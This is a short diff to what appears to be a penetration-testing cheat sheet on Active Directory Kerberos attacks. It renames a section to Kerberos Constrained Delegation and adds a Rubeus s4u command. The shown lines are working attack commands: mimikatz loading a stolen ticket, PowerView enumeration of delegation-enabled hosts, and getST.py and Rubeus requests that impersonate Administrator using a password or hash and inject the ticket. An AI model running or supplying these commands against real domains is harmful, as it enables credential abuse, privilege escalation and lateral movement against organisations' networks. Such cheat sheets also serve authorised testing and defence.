@@ -71,13 +71,14 @@
 
 Then use `mimikatz` to load the ticket.
 
-### Mimikatz 
+### Kerberos Constrained Delegation
 ```powershell
 
 mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
 Get-DomainComputer -TrustedToAuth | select -exp dnshostname #Identify
 Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo # Figure out exposed servie
 getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+rubeus s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt #with rubeus
  
 ```
 
